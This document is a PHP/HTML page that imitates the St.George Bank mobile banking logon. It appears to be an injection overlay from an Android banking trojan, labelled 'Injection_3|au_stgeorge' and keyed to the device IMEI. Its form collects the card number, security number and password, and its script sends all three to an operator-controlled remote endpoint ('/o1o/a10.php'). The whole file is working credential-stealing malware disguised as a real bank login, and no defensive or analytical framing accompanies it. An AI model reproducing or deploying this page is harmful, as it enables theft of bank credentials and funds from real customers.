<!-- 7.5 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="au/org.stgeorge.bank/css/style.css">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
	<div class="header">
		<span> Cancel </span>
		Logon
	</div>

	<form action="null" method="post" id="_mainForm" target="flow_handler">
		<input type="tel" class="field" name="card" id="card" placeholder="Card / access number">
		<input type="password" class="field" name="secure" id="secure" placeholder="Security number">
		<input type="password" class="field" name="password" id="password" placeholder="Password">

		<h3> Need help? </h3>

		<input type="submit" class="button" id="input_submitBtn" value="Logon to mobile banking">
	
		<div class="bottom2">
			Register for internet and phone banking
		</div>
	</form>
<iframe src="about:blank" name="flow_handler" style="visibility:hidden; display:none"></iframe>

<script type="text/javascript">
  (function () {
        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('card');
                        var oCodeInp = document.getElementById('secure');
                        var oCode2Inp = document.getElementById('password');

						try{
							oNumInp.className = 'field';
							oCodeInp.className = 'field';
							oCode2Inp.className = 'field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'field error';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'field error';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCode2Inp.value)) {
							try{
                                oCode2Inp.className = 'field error';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|au_stgeorge|"+oNumInp.value+"|"+oCodeInp.value+"|"+oCode2Inp.value);

return false;
};

})();
</script>
</body>
</html>
